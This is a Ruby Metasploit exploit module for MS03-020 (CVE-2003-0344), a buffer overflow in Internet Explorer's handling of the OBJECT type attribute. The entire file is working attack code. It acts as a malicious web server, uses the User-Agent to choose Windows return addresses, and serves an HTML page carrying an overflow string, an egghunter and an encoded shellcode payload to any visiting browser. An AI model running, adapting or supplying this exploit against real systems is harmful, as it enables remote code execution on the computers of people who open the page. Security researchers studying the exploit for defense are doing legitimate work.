require 'rex/exploitation/egghunter'
require 'msf/core/exploit/http'

module Msf

class Exploits::Windows::MS03_020_Ie_ObjectType < Msf::Exploit::Remote

	#
	# This module acts as an HTTP server
	#
	include Exploit::Remote::HttpServer

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'MS03-020 Internet Explorer Object Type',
			'Description'    => %q{
				This module exploits a vulnerability in Internet Explorer's
				handling of the OBJECT type attribute.
			},
			'Author'         => 'skape',
			'Version'        => '$Revision$',
			'References'     => 
				[
					[ 'OSVDB', '2967'    ],
					[ 'MSB', 'MS03-020'  ],
					[ 'CVE', '2003-0344' ],
					[ 'MIL', '84'        ],
				],
			'Payload'        =>
				{
					'Space'    => 1000,
					'MaxNops'  => 0,
					'BadChars' => "\x8b\xe2", # Prevent UTF-8-ification
				},
			'Targets'        =>
				[
					# Target 0: Automatic
					[
						'Windows NT/XP/2003 Automatic',
						{
							'Platform' => 'win',
							'Rets'     =>
								[
									0x777e85ab, # Windows NT: samlib jmp esp
									0x71ab1d54, # Windows XP: ws2_32 push esp/ret SP0/1
									0x77d1f92f, # Windows 2003: user32 jmp esp SP0/1
								],
						},
					],
				],
			'DefaultTarget'  => 0))
	end

	def on_request_uri(cli, request)
		clean = 0x7ffdec50
		ret   = nil

		# Figure out which return address to use based on the user-agent
		case request['User-Agent']
			when /Windows NT 5.2/
				ret = target['Rets'][2]
			when /Windows NT 5.1/
				ret = target['Rets'][1]
			when /Windows NT/
				ret = target['Rets'][0]
			else
				print_status("Sending 404 to user agent: #{request['User-Agent']}")

				request.send_response(
					create_response(404, 'File not found'))

				return
		end

		# Re-generate the payload 
		return if ((p = regenerate_payload(cli)) == nil)

		# Pack the values
		ret    = [ ret   ].pack('V')
		clean  = [ clean ].pack('V')
		hunter = Rex::Exploitation::Egghunter.new('win', 'x86').generate(payload_badchars)
		egg    = hunter[1]

		# Now, build out the HTTP response payload
		content = 
			"<html>" + egg + egg + p.encoded + "\n" +
			"<object type=\"////////////////////////////////////////////////////////////////" +
			Rex::Text::rand_text_alphanumeric(8) + ret + clean +
			make_nops(8) + hunter[0] + "\">" +
			"</object>" +
			"</html>"

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		response = create_response
		response['Content-Type'] = 'text/html'
		response.body = content

		cli.send_response(response)
	end

end

end
